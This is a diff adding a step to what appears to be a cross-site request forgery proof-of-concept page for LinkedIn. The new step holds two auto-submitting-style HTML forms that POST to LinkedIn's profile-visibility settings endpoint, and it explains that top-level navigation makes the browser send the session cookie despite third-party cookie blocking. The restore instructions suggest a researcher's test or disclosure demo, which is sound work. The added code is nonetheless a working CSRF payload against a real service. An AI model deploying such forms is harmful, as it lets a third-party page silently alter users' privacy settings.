@@ -34,6 +34,21 @@
 </div>
 
 <div class="step">
+  <span class="n">2b</span><b>Top level variant (test this in Firefox / Safari).</b><br>
+  This submits as a normal navigation instead of a background request, so the browser treats
+  linkedin.com as first party and attaches the session cookie even when third party cookies are
+  blocked. You will land on a blank LinkedIn page; press Back, then check step 1.
+  <form method="POST" action="https://www.linkedin.com/psettings/profile-visibility" style="margin-top:8px">
+    <input type="hidden" name="discloseAsProfileViewer" value="HIDE">
+    <button>HIDE (top level)</button>
+  </form>
+  <form method="POST" action="https://www.linkedin.com/psettings/profile-visibility">
+    <input type="hidden" name="discloseAsProfileViewer" value="DISCLOSE_FULL">
+    <button>DISCLOSE_FULL (top level)</button>
+  </form>
+</div>
+
+<div class="step">
   <span class="n">3</span><b>Reload the link in step 1.</b> The value has changed. Restore by clicking the original value.
 </div>
 
